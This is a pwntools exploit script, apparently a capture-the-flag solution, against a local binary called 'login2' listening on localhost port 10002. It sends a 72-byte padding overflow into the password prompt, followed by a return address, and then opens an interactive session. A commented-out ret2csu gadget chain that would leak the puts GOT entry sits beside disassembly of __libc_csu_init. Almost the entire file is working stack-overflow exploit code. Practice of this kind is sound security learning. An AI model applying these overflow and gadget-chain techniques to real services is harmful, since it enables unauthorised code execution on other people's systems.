from pwn import *
context.log_level = 'debug'

TARGET = './login2'
HOST = 'localhost'
PORT = 10002

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
b*0x400a1f
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

'''
285   400a60:   4c 89 fa                mov    rdx,r15
286   400a63:   4c 89 f6                mov    rsi,r14
287   400a66:   44 89 ef                mov    edi,r13d
288   400a69:   41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
289   400a6d:   48 83 c3 01             add    rbx,0x1
290   400a71:   48 39 dd                cmp    rbp,rbx
291   400a74:   75 ea                   jne    400a60 <__libc_csu_init+0x40>
292   400a76:   48 83 c4 08             add    rsp,0x8
293   400a7a:   5b                      pop    rbx                                                    
294   400a7b:   5d                      pop    rbp
295   400a7c:   41 5c                   pop    r12
296   400a7e:   41 5d                   pop    r13
297   400a80:   41 5e                   pop    r14
298   400a82:   41 5f                   pop    r15
299   400a84:   c3                      ret
'''

call = 0x400a60
pop6 = 0x400a7a

r.recvuntil('ID:')
r.sendline('A')
r.recvuntil('Password:')

payload = ''
payload += 'A' * 72
payload += p64(0x4009e7)
'''
payload += p64(0)
payload += p64(1)
payload += p64(elf.got['puts'])
payload += p64(elf.got['puts'])
payload += p64(0xc0bebeef)
payload += p64(0xc0bebeef)
payload += p64(0xc0bebeef)
payload += p64(call)
payload += p64(1)
payload += p64(2) 
payload += p64(3)
payload += p64(4) 
payload += p64(5)
payload += p64(6)
payload += p64(7)
payload += p64(8)
payload += p64(elf.sym['main'])
'''
r.sendline(payload)


r.interactive()
r.close()
